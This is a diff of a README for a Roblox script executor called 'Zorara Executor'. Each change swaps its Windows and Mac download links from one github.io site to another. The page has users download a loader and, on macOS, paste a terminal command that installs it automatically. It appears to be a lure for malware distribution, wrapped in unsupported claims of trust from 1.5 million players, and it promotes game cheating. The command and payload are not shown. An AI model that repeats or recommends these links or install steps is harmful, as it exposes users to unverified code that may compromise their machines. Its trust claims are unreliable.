@@ -10,8 +10,8 @@ The **⚡ Zorara Executor** is built around one goal: zero friction. Single-clic
 
 <div align="center">
 
-[![Download Zorara Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download Zorara Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
 
 </div>
 
@@ -113,7 +113,7 @@ The **⚡ Zorara Executor** is built around one goal: zero friction. Single-clic
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20ZORARA%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20ZORARA%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 ### 🍎 macOS
 
@@ -121,7 +121,7 @@ The **⚡ Zorara Executor** is built around one goal: zero friction. Single-clic
 2. **Paste the command** (`⌘ + V`) and press Enter
 3. **Follow the prompts** — the loader installs automatically
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
 
 ---
 
@@ -180,5 +180,5 @@ New versions typically available **within 24 hours** of any Roblox update.
 
 Join over 1.5 million players who trust Zorara Executor for zero-friction, transparent Roblox script execution in 2026.
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20ZORARA%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20ZORARA%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
